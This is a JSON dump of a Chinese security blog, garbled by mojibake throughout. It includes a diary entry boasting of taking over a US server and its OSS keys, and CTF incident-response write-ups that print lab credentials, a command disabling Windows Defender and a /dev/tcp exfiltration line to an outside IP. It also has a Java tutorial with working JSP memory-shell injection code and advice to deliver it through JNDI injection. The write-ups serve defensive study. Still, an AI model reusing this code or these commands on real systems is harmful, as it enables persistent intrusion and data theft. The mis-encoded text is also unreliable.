[{"title":"ä¸Šç­çš„ç”Ÿæ´»-è®°å½•å¼€å§‹","path":"/2026/01/23/posts/dream/","content":"ä¸Šç­çš„ç”Ÿæ´»-è®°å½•å¼€å§‹~æ˜æ—¥æ–¹èˆŸå½“ä¸ªäºº 2025-12-3â€‹ æœ€è¿‘æ‰¾åˆ°ä¸€é¦–æ­Œæ˜¯è¡€ç•Œæˆ˜çº¿çš„World Goes Round å¥½å¥½å¬è€é“ä»¬ï¼Œä»11æœˆä¸Šç­åˆ°ç°åœ¨å¥½åƒå¼€å§‹å¿™èµ·æ¥äº†ï¼Œæ¸—é€æ¯”æŠ¥å‘Šè¿˜ç®€å•å“ˆå“ˆğŸ˜„ï¼Œå¸Œæœ›è‡ªå·±å¿ƒæƒ…è¶Šæ¥è¶Šå¥½ï¼Œè¿æ°”è¶Šæ¥è¶Šå¥½Ciallo! 2025-12-13â€‹\tä¸ºä»€ä¹ˆè¿™ä¹ˆä¹…æ²¡æœ‰æ›´æ–°ï¼Œdont know æˆ‘åªçŸ¥é“æ˜ŸæœŸ6åŠ ç­ï¼Œä½†æ˜¯æŒ–åˆ°äº†ä¸€ä¸ªè‡ªå·±è®¤ä¸ºä¹Ÿå¯ä»¥æœ‰ä»·å€¼çš„æ¼æ´ï¼Œå‘ç°ä¸€ä¸ªæ­Œä¸€ä¸ªäººæƒ³ç€ä¸€ä¸ªäººæ­Œè¿˜æŒºå¥½å¬åŠ æ²¹å§ï¼ï¼Œä»Šå¤©åƒé¹…è‚‰å…„å¼Ÿä»¬ï¼Œä¹°äº†ä¸€ä¸ªXGæˆ˜é˜Ÿçš„å«è¡£è¿˜æŒºå¥½çœ‹ï¼Œå¸Œæœ›èƒ½åœ†æ¢¦ä¸Šæµ·TIï¼Œæœ‰æƒ…äººé’Ÿæƒ…çœ·å±å˜»å˜»ï¼ŒCiallo! 2025-12-15â€‹\tä»Šå¤©æ‹¿ä¸‹äº†ä¸€ä¸ªç¾å›½æœåŠ¡å™¨ï¼Œæ‹¿ä¸‹OSSAKSKï¼Œkimojiï¼ŒCiallo! 2026å¹´-01-23â€‹\tä¸æ˜¯å“¥ä»¬ï¼Œé¹°è§’ä½ èƒ½ä¸èƒ½å½“ä¸ªäººï¼Œç©æ˜æ—¥æ–¹èˆŸè¿™ä¹ˆå¤šå¹´äº†ï¼Œå†…æµ‹èµ„æ ¼ä¸ç»™å°±ç®—äº†ï¼Œå¼€æœç»™ä¸¤æŠ½æ˜¯ä»€ä¹ˆæ„æ€æˆ‘è¯·é—®äº†ï¼Ÿé‚£ä¸ªå¸¸é©»ç»™ä»€ä¹ˆ100æŠ½æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ","tags":["life is like a boat"]},{"title":"å‹’ç´¢äº‹ä»¶æ’æŸ¥-é’å°‘å¹´","path":"/2026/01/20/posts/bt2-lesuo/","content":"ç¯å¢ƒç½‘å€å¦‚ä¸‹ Administrator å¯†ç ä¸º Sierting789@ https://www.qsnctf.com/#/main/driving-range?page=8category=27difficulty=keyword=user_answer=user_favorite=tag_ids= flag1ä¸Šæœºæ’æŸ¥æäº¤ç—…æ¯’å®¶æ—çš„åç§°ï¼Œå¯è®¿é—®åº”æ€¥å“åº”.comç¡®å®šå®¶æ—åç§°ï¼Œä»¥flag{xxx}æäº¤(å¤§å°å†™æ•æ„Ÿ) flag{Live} Flag2æäº¤å‹’ç´¢ç—…æ¯’é¢„ç•™çš„IDï¼Œä»¥flag{xxxxxx}è¿›è¡Œæäº¤ å¯¹ç…§ä¸Šå›¾txtæ–‡ä»¶id flag{170605242653} Flag3è§£å¯†å¹¶æäº¤æ¡Œé¢ä¸­flag.txt.LIVEçš„flagï¼Œä»¥flag{xxxx}æäº¤ https://www.solarsecurity.cn/tools.htmlã€‚å·¥å…·ä¸‹è½½ è§£å‹å¯†ç solarsecurity flag{cf0971c1d17a03823c3db541ea3b4ec2} Flag4æäº¤Windows Defenderåˆ é™¤æ”»å‡»è€…C2çš„æ—¶é—´ï¼Œä»¥flag{2025.1.1_1:10}æ ¼å¼æäº¤ flag{2025.8.25_10:43} Flag5æäº¤æ”»å‡»è€…å…³é—­Windows Defenderçš„æ—¶é—´ï¼Œä»¥flag{2025.1.1_1:10}æ ¼å¼æäº¤ äº‹ä»¶idï¼š4624ï¼šè¡¨ç¤ºå¸æˆ·å·²æˆåŠŸç™»å½•ã€‚è¿™ä¸ªäº‹ä»¶IDå¯ä»¥ç”¨æ¥ç­›é€‰ç³»ç»Ÿä¸­æ‰€æœ‰æˆåŠŸç™»å½•çš„è®°å½•4625ï¼šè¡¨ç¤ºå¸æˆ·ç™»å½•å¤±è´¥ã€‚è¿™ä¸ªäº‹ä»¶IDå¯ä»¥å¸®åŠ©æˆ‘ä»¬åˆ¤æ–­æ˜¯å¦å­˜åœ¨RDPçˆ†ç ´æ”»å‡»ç­‰æƒ…å†µ4634ï¼šè¡¨ç¤ºå¸æˆ·è¢«æ³¨é”€ã€‚è¿™ä¸ªäº‹ä»¶IDè®°å½•äº†ç”¨æˆ·æ³¨é”€çš„æƒ…å†µ4647ï¼šè¡¨ç¤ºç”¨æˆ·å‘èµ·æ³¨é”€ã€‚è¿™ä¸ªäº‹ä»¶IDè®°å½•äº†ç”¨æˆ·ä¸»åŠ¨æ³¨é”€çš„è¡Œä¸º4648ï¼šè¡¨ç¤ºè¯•å›¾ä½¿ç”¨æ˜ç¡®çš„å‡­è¯ç™»å½•ã€‚è¿™ä¸ªäº‹ä»¶IDå¯ä»¥æŸ¥çœ‹è¿œç¨‹ç™»å½•çš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚IPåœ°å€ç­‰4672ï¼šè¡¨ç¤ºè¶…çº§ç®¡ç†å‘˜ç™»å½•4720ï¼šè¡¨ç¤ºæ–°ç”¨æˆ·çš„åˆ›å»º5001ï¼šRealâ€‘time protection is disabled é˜²æŠ¤è¢«å…³é—­ ä½¿ç”¨fulleventlogviewå·¥å…·æŸ¥çœ‹äº‹ä»¶ flag{2025.8.25_10:45} Flag6æäº¤æ”»å‡»è€…ä¸Šä¼ C2çš„ç»å¯¹è·¯å¾„ï¼Œæ ¼å¼ä»¥flag{C:\\xxx\\xxx}æäº¤ flag{C:\\Users\\Administrator\\Downloads\\Wq12D.exe} Flag7æäº¤æ”»å‡»è€…C2çš„IPå¤–è”åœ°å€ï¼Œæ ¼å¼ä»¥flag{xx.x.x.x}æäº¤ å¾®æ­¥åœ¨çº¿ flag{192.168.186.2} flag8æäº¤æ”»å‡»è€…åŠ å¯†å™¨ç»å¯¹è·¯å¾„ï¼Œæ ¼å¼ä»¥flag{C:\\xxx\\xxx}æäº¤ åŠ å¯†å™¨æ˜¯å¿…éœ€ç»„ä»¶å¯¹äºå‹’ç´¢ç—…æ¯’æ¥è¯´ éå†ç›®æ ‡æ–‡ä»¶ â†’ ç”¨æŒ‡å®šåŠ å¯†ç®—æ³•å’Œå¯†é’¥æŠŠå†…å®¹å˜æˆå¯†æ–‡ â†’ è®©åŸæ–‡ä»¶æ‰“ä¸å¼€ã€‚å®ƒå¯ä»¥æ˜¯ï¼š å‹’ç´¢è½¯ä»¶ exe é‡Œçš„ä¸€ä¸ªå†…éƒ¨æ¨¡å—å‡½æ•°ï¼› å•ç‹¬çš„ä¸€ä¸ª exeDLLï¼Œç”±ä¸»ç¨‹åºè°ƒç”¨ï¼› è¢«è„šæœ¬å®é‡Šæ”¾å’Œæ‰§è¡Œçš„ä¸€æ®µåŠ å¯†é€»è¾‘ã€‚ æ˜¯ä¸€ä¸ªexeæˆ–è€…dllæ¨¡å— å‹’ç´¢è½¯ä»¶ å¸¦æœ‰â€œåŠ å¯†å™¨â€åŠŸèƒ½çš„æ¶æ„ç¨‹åºï¼›åŠ å¯†å™¨ å‹’ç´¢è½¯ä»¶é‡Œå…·ä½“è´Ÿè´£â€œæŠŠä½ çš„æ–‡ä»¶é”æ­»â€çš„é‚£éƒ¨åˆ†å®ç°ã€‚ ï¼Ÿä¸ºä»€ä¹ˆä¸ç›´æ¥åŒ…å«ä¸€èµ·å‘¢ 1:æ¨¡å—åŒ–ï¼Œæ–¹ä¾¿å¤ç”¨å’Œå‡çº§ 2:é™ä½æ›å…‰é¢ã€å¯¹æŠ—å®‰å…¨æ£€æµ‹ flag{C:\\Users\\Administrator\\Documents\\systime.exe} flag9æº¯æºé»‘å®¢æ”»å‡»è·¯å¾„ï¼Œåˆ©ç”¨çš„å“ªä¸ªæ¼æ´å¹¶æ¨æµ‹éªŒè¯ï¼Œæäº¤èµ·è¿è¡Œæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œå¦‚ï¼šflag{C:\\xxx\\xxx\\xxx} æŸ¥çœ‹æ˜¯å¦æ˜¯ftpæœªæˆæƒ é€šè¿‡4624idæŸ¥çœ‹æ—¥å¿—å‘¢ æˆ–è€…æŸ¥çœ‹å…¶ä»–ç«¯å£ä¿¡æ¯ å‘ç°å­˜åœ¨è‹¥ä¾ é€šè¿‡æœç´¢.jarå‘ç°è‹¥ä¾ç›®å½• powershell Set-MpPreference -DisableRealtimeMonitoring $true å…³é—­å®æ—¶ç›‘æ§ flag{E:\\ruoyi\\ruoyi-admin.jar}","tags":["blueteam"]},{"title":"å…¬äº¤è½¦äº‹ä»¶æ’æŸ¥é¶æœº-é’å°‘å¹´","path":"/2026/01/19/posts/bt1/","content":"https://www.brimdata.io/download/ zuiå·¥å…·æŠ“åŒ…æµé‡åˆ†æ https://mp.weixin.qq.com/s/BoS3eNyC7Vn7phkTRpg2og?spm_id_from=333.1369.0.0 webshellç‰¹å¾å¤§å…¨åˆ†æ Flag1https://www.qsnctf.com/#/main/driving-range?page=1category=difficulty=keyword=%E5%85%AC%E4%BA%A4%E8%BD%A6%E7%B3%BB%E7%BB%9Fuser_answer=user_favorite=tag_ids= Flag1: ä¸­é—´ä»¶ä¸­æ—¥å¿—æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ¼æ´ï¼Œé€šè¿‡åˆ†ææ—¥å¿—ã€è§£å¯†å‡ºç”¨æˆ·å¯†ç æ•°æ®æäº¤å‰é¢ä¸¤ä¸ªç”¨æˆ·å netstat -lntp æŸ¥çœ‹ç«¯å£ä¿¡æ¯å‘ç°å¼€å¯äº†å“ªäº›æœåŠ¡Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 19/sshd: /usr/sbin/ tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 16/apache2 tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN 19/sshd: /usr/sbin/ å‘ç°å¼€å¯äº†80 3306é‚£ä¹ˆå°±æ˜¯é€šè¿‡webshellæ‰“è¿›æ¥äº†ï¼Œæˆ–è€…sshçˆ†ç ´ cat -n /var/log/apache2/access.log awk print $1,$6,$7 access.log ç­›é€‰å‡ºæ¥1 6 7è¡Œçš„æ•°æ®awk ä¼šæŠŠä¸€è¡ŒæŒ‰**ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼æˆ– Tabï¼‰**æ‹†æˆå¾ˆå¤šâ€œå­—æ®µâ€ï¼šæ²¡æœ‰ç­›é€‰ 5952 171.213.255.181 - - [19/Jan/2026:01:08:26 +0000] GET /favicon.ico HTTP/1.1 404 501 http://challenge.qsnctf.com:34081/ Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0ç­›é€‰è¿‡å171.213.255.181 GET /favicon.ico cat /result1.pcap /dev/tcp/116.62.32.64/6666 ä¸‹è½½æµé‡åŒ…æ–‡ä»¶åˆ†æ å®æˆ˜æ²¡æœ‰è¿™ç§pcpaåŒ…åªèƒ½è‡ªå·±åˆ†æ é€šè¿‡ä¸‹è½½è½¯ä»¶åˆ†æzenä¹Ÿè¡Œ easytsharkä¹Ÿè¡Œ ç„¶åæ”¾åˆ°webç•Œé¢ä¸Šå—æˆåŠŸsleepäº†å‘ç°å­˜åœ¨sqlæ³¨å…¥ ç„¶åä½ é€šè¿‡è¿™ä¸ªaccess.log ç»™aiåˆ†æ æŸ¥çœ‹é‡Œé¢æ³„éœ²çš„ç”¨æˆ·åå­— è§£å‡ºflag flag{sunyue-chenhao} Flag2é»‘å®¢é€šè¿‡è·å–çš„ç”¨æˆ·åå¯†ç ï¼Œåˆ©ç”¨å¯†ç å¤ç”¨æŠ€æœ¯ï¼Œçˆ†ç ´äº†FTPæœåŠ¡ï¼Œåˆ†ææµé‡ä»¥åæ‰¾åˆ°å¼€æ”¾çš„FTPç«¯å£ï¼Œå¹¶æ‰¾åˆ°é»‘å®¢ç™»å½•æˆåŠŸåè·å–çš„ç§å¯†æ–‡ä»¶ï¼Œæäº¤å…¶æ–‡ä»¶ä¸­å†…å®¹ å› ä¸ºé¶åœºæ˜ å°„çš„å…³ç³»ç«¯å£ä¸ä¸€æŸ¥çœ‹2121ç«¯å£è¯•è¯• tcp.port==2121tcp contains successfully rootroot@2c21674009a4:~# cd /home/wangqiang/ftp/root@2c21674009a4:/home/wangqiang/ftp# lssensitive_credentials.txtroot@2c21674009a4:/home/wangqiang/ftp# ls -altotal 12drwxr-xr-x 2 root root 4096 Jul 24 03:52 .drwxr-xr-x 3 root root 4096 Jul 24 03:52 ..-rw-r--r-- 1 root root 62 Jul 23 01:21 sensitive_credentials.txtroot@2c21674009a4:/home/wangqiang/ftp# cat sensitive_credentials.txt INTERNAL_FTP_ADMIN_PASSWORD=FtpP@ssw0rd_For_Admin_Backup_2025root@2c21674009a4:/home/wangqiang/ftp# lssensitive_credentials.txtroot@2c21674009a4:/home/wangqiang/ftp# flag{INTERNAL_FTP_ADMIN_PASSWORDFtpP@ssw0rd_For_Admin_Backup_2025} Flag3å¯æ¶çš„é»‘å®¢æ‰¾åˆ°äº†ä»»æ„æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä½ éœ€è¦åˆ†ææ—¥å¿—å’Œæµé‡ä»¥åŠwebå¼€æ”¾çš„ç¨‹åºæ‰¾åˆ°é»‘å®¢ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæäº¤æœ¨é©¬ä½¿ç”¨çš„å¯†ç ï¼Œæäº¤æ ¼å¼ï¼šflag{password} åˆ¤æ–­ä¸ºå“¥æ–¯æ‹‰æœ¨é©¬webshell Flag{woaiwojia} Flag4åˆ†ææµé‡ï¼Œé»‘å®¢æ¤å…¥äº†ä¸€ä¸ªwebæŒ–çŸ¿æœ¨é©¬ï¼Œè¿™ä¸ªæœ¨é©¬ç°å®æƒ…å†µä¸‹ä¼šåœ¨ç”¨æˆ·è®¿é—®åæ¶ˆè€—ç”¨æˆ·çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿(æœ¬ç¯å¢ƒå·²åšæ— å®³åŒ–å¤„ç†)ï¼Œæäº¤é»‘å®¢ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶æ—¶çš„åˆå§‹åç§°ï¼Œæäº¤æ ¼å¼ï¼šflag{xxx.xxx} å¾—åˆ°ä¿¡æ¯ cmdLine Xsh -c cd /var/www/html/public;mv uploads/map.php /var/www/html/public/index.php 21methodName execCommandç§»åŠ¨map.php åˆ°index.php å‘ç°ä»–ä½¿ç”¨äº†å“¥æ–¯æ‹‰çš„ä¸Šä¼ åŠŸèƒ½ fileName â€¦ varwwwhtmlpublicuploadsmap.php è¡¨ç¤ºä¸Šä¼ çš„æ–‡ä»¶ fileValue â€¦ è¡¨ç¤ºå†™å…¥çš„å…·ä½“å†…å®¹ æ‰€ä»¥ä¸Šä¼ æ–‡ä»¶ä¸º flag{map.php} Flag5åˆ†ææµé‡å¹¶ä¸Šæœºæ’æŸ¥ï¼Œé»‘å®¢æ¤å…¥çš„ç½‘é¡µæŒ–çŸ¿æœ¨é©¬æ‰€ä½¿ç”¨çš„çŸ¿æ± åœ°å€æ˜¯ä»€ä¹ˆï¼Œæäº¤çŸ¿æ± åœ°å€(æ’æŸ¥å®Œæ¯•åå¯ä»¥å°è¯•åˆ é™¤å®ƒ)æäº¤æ ¼å¼ï¼šflag{xxxxxxx.xxxx.xxx:xxxx} å› ä¸ºä»–æ›¿æ¢äº†index.php æ‰€ä»¥æˆ‘ä»¬æŸ¥çœ‹index.php ç„¶åç»™aiåˆ†æ flag{gulf.moneroocean.stream:10128}","tags":["blueteam"]},{"title":"JAVA-å†…å­˜é©¬+servlet+Filter","path":"/2025/11/04/posts/memory/","content":"JAVA-å†…å­˜é©¬-servlet 1ï¼šservletå†…å­˜é©¬Servlet å†…å­˜é©¬æ˜¯é€šè¿‡åŠ¨æ€æ³¨å†Œ Servlet æ¥å®ç°çš„ä¸€ç§å†…å­˜æ”»å‡»æ‰‹æ®µã€‚åœ¨ Java Web åº”ç”¨ä¸­ï¼ŒServlet ä½œä¸ºå¤„ç†å®¢æˆ·ç«¯è¯·æ±‚çš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œèƒ½å¤Ÿç›´æ¥å¤„ç† HTTP è¯·æ±‚å¹¶è¿”å›å“åº”ã€‚æ”»å‡»è€…åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œé€šè¿‡ç¨‹åºåŒ–åœ°å‘ Web å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰åœ¨è¿è¡Œæ—¶æ³¨å†Œæ¶æ„çš„ Servlet å¯¹è±¡ï¼Œä½¿å¾—è¯¥ Servlet èƒ½å¤Ÿåœ¨æ²¡æœ‰å®é™…æ–‡ä»¶å­˜åœ¨çš„æƒ…å†µä¸‹æ‰§è¡Œæ¶æ„ç¨‹åºã€‚ ä½†æ˜¯æˆ‘ä»¬ä¹Ÿè¦ææ¸…é™¤ï¼ŒServletç±»æ˜¯æ€ä¹ˆè£…è½½åˆ°Webå®¹å™¨é‡Œé¢çš„ è‡ªå·±ç¼–å†™ä¸€ä¸ªç±» é‡å†™dogetæ–¹æ³• package com.yr.memshellser;import javax.servlet.Servlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;public class MyServlet extends HttpServlet @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException resp.getWriter().println(Hello World); å†web.xmlä¸‹é¢å®šä¹‰è·¯å¾„æ˜¯my ?xml version=1.0 encoding=UTF-8?web-app xmlns=http://xmlns.jcp.org/xml/ns/javaee xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance xsi:schemaLocation=http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd version=4.0 servlet servlet-nameMyServlet/servlet-name servlet-classcom.yr.memshellser.MyServlet/servlet-class /servlet servlet-mapping servlet-nameMyServlet/servlet-name url-pattern/my/url-pattern /servlet-mapping/web-app ç„¶åè®¿é—®è·¯å¾„è§¦å‘URL ä¸¤ç§ç”Ÿæ•ˆæ–¹æ³•ï¼šä¸€ç§å®šä¹‰xml ä¸€ç§@WebServlet(name = helloServlet, value = /hello-servlet) è¿™ç§ servlet servlet-nameMyServlet/servlet-name servlet-classcom.yr.memshellser.MyServlet/servlet-class /servlet servlet-mapping servlet-nameMyServlet/servlet-name url-pattern/My/url-pattern /servlet-mapping tomcatæ˜¯å¦‚ä½•åŠ è½½è¿™äº›servletçš„å‘¢â€‹\tåŠ è½½tomcatæºç  compileä¸è¡Œå°±ç”¨provided dependency groupIdorg.apache.tomcat/groupId artifactIdtomcat-catalina/artifactId version9.0.74/version scopecompile/scope !-- æˆ– providedï¼Œæ ¹æ®åœºæ™¯è°ƒæ•´ --/dependency â€‹\tè¿™é‡Œçš„ä»£ç ç±»å°±æ˜¯åŠ è½½sevletè¿›å»å®¹å™¨çš„ä»£ç æˆ‘ä»¬å¯ä»¥æ–­ç‚¹çœ‹ä¸‹ æˆåŠŸæ–­ä¸‹æ¥ åœ¨ä¸‹é¢å‘ç°äº†MAPé‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„å¯¹è±¡ åŒæ—¶è¿˜æœ‰æ˜ å°„å…³ç³»My æ˜ å°„åˆ°MyServlet .jspæ˜ å°„åˆ°jsp æˆ‘ä»¬æ‰€ä»¥çš„Servletå˜æˆäº†webxmlä¼ å…¥è¿›å»äº†configureContextæ–¹æ³•ä¸­è¿›è¡Œå¤„ç† è¿™é‡Œçš„forå¾ªç¯å°±æ˜¯æ·»åŠ çš„åœ°æ–¹ æŠŠservletæ”¾åˆ° wrapperé‡Œé¢ç„¶åæŠŠï¼Œwrapperæ”¾åˆ°äº†contextä¸­ï¼Œå°±å®Œæˆæ·»åŠ servletåˆ°tomcatä¸­çš„è¿‡ç¨‹ å¦‚ä¸‹é¢ä»£ç æ·»åŠ mapping for (EntryString, String entry : webxml.getServletMappings().entrySet()) context.addServletMappingDecoded(entry.getKey(), entry.getValue()); æ‰€ä»¥è¿™ä¸¤ä¸ªä»£ç å®Œæˆäº†servletå’Œmappingçš„æ·»åŠ  context.addChild(wrapper);for (EntryString, String entry : webxml.getServletMappings().entrySet()) context.addServletMappingDecoded(entry.getKey(), entry.getValue()); æ‰€ä»¥è®©ç›®æ ‡æ‰§è¡Œè¿™é‡Œä¸¤ä¸ªä»£ç å°±è¡Œäº†å¯¹å§ã€‚ ä½†æ˜¯contextæ˜¯ä»€ä¹ˆå‘¢ åœ¨doGetçš„åœ°æ–¹æ–­ç‚¹ è¾“å…¥æ–¹æ³• åœ¨è¿™é‡Œå‘ç°äº†æˆ‘ä»¬è¦çš„é‚£ä¸ªcontext æ‰€ä»¥æˆ‘ä»¬æ‹¿åˆ°é‚£ä¸ªStandard contextå°±å¯ä»¥æ‰§è¡Œä¸Šé¢ä¸¤æ­¥äº† ç¼–å†™JSPJSPï¼ˆJava Server Pageï¼‰æ˜¯ Servlet çš„åŠ¨æ€æ‰©å±•å½¢å¼â€”â€”Web å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰ä¼šå°† JSP æ–‡ä»¶ç¼–è¯‘æˆ Servlet ç±»ï¼ˆ.classæ–‡ä»¶ï¼‰ï¼Œå¹¶åœ¨å†…å­˜ä¸­åŠ è½½æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªtest.jspæ–‡ä»¶åœ¨ç¼–è¯‘åä¼šç”Ÿæˆå¯¹åº”çš„test_jsp.javaå’Œtest_jsp.classï¼Œå…¶æœ¬è´¨å°±æ˜¯ä¸€ä¸ª Servletã€‚ %@ page import=java.io.IOException %%@ page import=java.lang.reflect.Field %%@ page import=org.apache.catalina.core.ApplicationContext %%@ page import=org.apache.catalina.core.StandardContext %%@ page import=org.apache.catalina.Wrapper %%@ page contentType=text/html;charset=UTF-8 language=java %%! //å®šä¹‰æ¶æ„çš„servletpublic class Memshell extends HttpServlet @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException Runtime.getRuntime().exec(calc); %% ServletContext servletContext = request.getServletContext(); //æ‹¿åˆ°applicationContext Field context = servletContext.getClass().getDeclaredField(context); context.setAccessible(true); //è·å–æŒ‡å®šå¯¹è±¡ä¸­å½“å‰å­—æ®µçš„å€¼ã€‚è·å–servletContextä¸­çš„contextå°±æ˜¯æˆ‘ä»¬çš„ApplicationContextå¯¹è±¡ ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext); Field context1 = applicationContext.getClass().getDeclaredField(context); context1.setAccessible(true); StandardContext standardContext = (StandardContext)context1.get(applicationContext); //å°†Memshellå°è£…åˆ°wrapperä¸­ Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(memshell); wrapper.setServletClass(Memshell.class.getName()); wrapper.setServlet(new Memshell()); //æ·»åŠ wapperåˆ°contextä¸­ç„¶åæ˜ å°„ standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(/mem,memshell);% ç°åœ¨æˆ‘ä»¬ä¸èƒ½è®¿é—®mem ç„¶åæˆ‘ä»¬è§¦å‘jspåæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ å½“ä½ åˆ é™¤jspåä¾æ—§å¯ä»¥è¿è¡Œ å½“ä½ è§‰å¾—jspå¤ªå®¹æ˜“è¢«æŸ¥æ€äº†ï¼Œä½†æ˜¯å¦‚æœå¯¹æ–¹æœ‰jndiæ³¨å…¥çš„è¯ä½ å¯ä»¥ 1ï¼šæ‰¾åˆ°å¯æ§ç‚¹ 2ï¼šæ”¾è¿™ä»£ç åˆ°classä¸­æ¯”å¦‚ç”¨ marshalsec å¯åŠ¨ä¸€ä¸ªldapæœåŠ¡ æŒ‡å®šè¿™ä¸ªç±» 2ï¼šfilterå†…å­˜é©¬å®¢æˆ·ç«¯ç»è¿‡çš„è¯·æ±‚ç»è¿‡æœåŠ¡å™¨æ—¶å€™ï¼Œå…ˆé€šè¿‡è¿‡æ»¤å™¨å†åˆ°servletå»å¤„ç† è¿‡æ»¤å™¨æ•°é‡ä¸æ­¢ä¸€ä¸ªï¼Œfilterå¯ä»¥ä¸€ä¸ªä¼ ä¸€ä¸ª dependency groupIdorg.apache.tomcat/groupId artifactIdtomcat-catalina/artifactId version9.0.74/version scopecompile/scope !-- æˆ– providedï¼Œæ ¹æ®åœºæ™¯è°ƒæ•´ --/dependency é¦–å…ˆå’Œä¸Šé¢ä¸€æ ·åˆ›å»ºä¸€ä¸ªservletç¨‹åº æˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªè¿‡æ»¤å™¨æŸ¥çœ‹æ•ˆæœ public class Hellofilter extends HttpFilter @Override protected void doFilter(HttpServletRequest req, HttpServletResponse res, FilterChain chain) throws IOException, ServletException String cmd = req.getParameter(cmd); if (cmd == null) super.doFilter(req, res, chain); else res.setContentType(text/html); res.getWriter().println(ä½ çš„ä»£ç é‡Œé¢æœ‰+ cmd); åœ¨web.xmlä¸­æ·»åŠ  filter filter-namehello-servlet/filter-name filter-classcom.yr.memshellfilter.Hellofilter/filter-class /filter è®¿é—®å…¨éƒ¨éƒ½ç”Ÿæ•ˆ filter-mapping filter-namehello-servlet/filter-name url-pattern/*/url-pattern /filter-mapping å½“æˆ‘ä»¬çš„å‚æ•°æœ‰cmdçš„æ—¶å€™å°±ä¼šç»™æˆ‘ä»¬æ‹¦æˆªåˆ° é‚£æˆ‘ä»¬åœ¨åŠ¨æ€çš„æ—¶å€™æ€ä¹ˆæ·»åŠ è¿™ä¸ªè¿›å»å‘¢ æˆ‘ä»¬æ–­ç‚¹è°ƒè¯•æ‰¾åˆ°äº†è¿™ä¸ªdoFilterç±» ä¸ç®¡æ€ä¹ˆæ ·éƒ½ä¼šæ‰§è¡ŒinternalDoFilteræ–¹æ³• å¹¶ä¸”æœ‰ä¸€ä¸ªfiltersæ•°ç»„é‡Œé¢çš„æŒ‡é’ˆå°±æ˜¯æˆ‘ä»¬çš„filterçš„ä¼ é€’ï¼Œé‚£æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æŠŠfilteræ”¾å…¥åˆ°è¿™ä¸ªæ•°ç»„ä¸­ if (pos n) ApplicationFilterConfig filterConfig = filters[pos++]; try Filter filter = filterConfig.getFilter();","tags":["java"]},{"title":"JavaEECC1é“¾æ¡æŒç»­æ›´æ–°+fastjson1.2.24+log4j","path":"/2025/10/29/posts/cc/","content":"JavaEECCé“¾æ¡ åˆ«æ²‰æ·€äº†è¡Œå— ä¸€ï¼š ä¸‹è½½å¯¹åº”çš„CDK 8u65ä»¥åŠCCé“¾æ¡1å‚è€ƒJAVAå®‰å…¨åˆæ¢(ä¸‰):CC1é“¾å…¨åˆ†æ-å…ˆçŸ¥ç¤¾åŒº Oracle JDK 8u65 å…¨å¹³å°å®‰è£…åŒ…ä¸‹è½½ - ç éœ¸éœ¸ JDK 8u71 åŠä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼ŒOracle å¯¹è¯¥æ–¹æ³•çš„é€»è¾‘è¿›è¡Œäº†ä¿®æ”¹ï¼Œå¢åŠ äº†å¯¹æ¶æ„ç±»çš„æ ¡éªŒï¼Œç›´æ¥å¯¼è‡´ CC1 é“¾çš„åˆ©ç”¨è·¯å¾„è¢«é˜»æ–­ã€‚è€ŒJDK 8u65ï¼ˆå±äº 8u71 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰ æœªåŒ…å«è¿™äº›å®‰å…¨ä¿®å¤ï¼Œä»ä¿ç•™äº†åŸå§‹çš„ååºåˆ—åŒ–é€»è¾‘ï¼Œå› æ­¤èƒ½æˆåŠŸè§¦å‘æ¼æ´ æ³¨æ„CC1å’Œç‰ˆæœ¬CCé“¾æ¡3.21æ²¡å…³ CC1æ˜¯CCé“¾æ¡çš„ç¬¬ä¸€ä¸ªé“¾æ¡ä¸æ˜¯CCç‰ˆæœ¬ 3.2.1åŒ…å«äº†CC1çš„é“¾æ¡å’ŒJDKé…åˆè¿›è¡Œååºåˆ—åŒ–æµ‹è¯• dependencies!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --dependencygroupIdcommons-collections/groupIdartifactIdcommons-collections/artifactIdversion3.2.1/versionclassifiersources/classifier/dependency/dependencies ?xml version=1.0 encoding=UTF-8?project xmlns=http://maven.apache.org/POM/4.0.0 xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance xsi:schemaLocation=http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd modelVersion4.0.0/modelVersion groupIdcom.yr/groupId artifactIdCC1/artifactId version1.0-SNAPSHOT/version properties maven.compiler.source8/maven.compiler.source maven.compiler.target8/maven.compiler.target 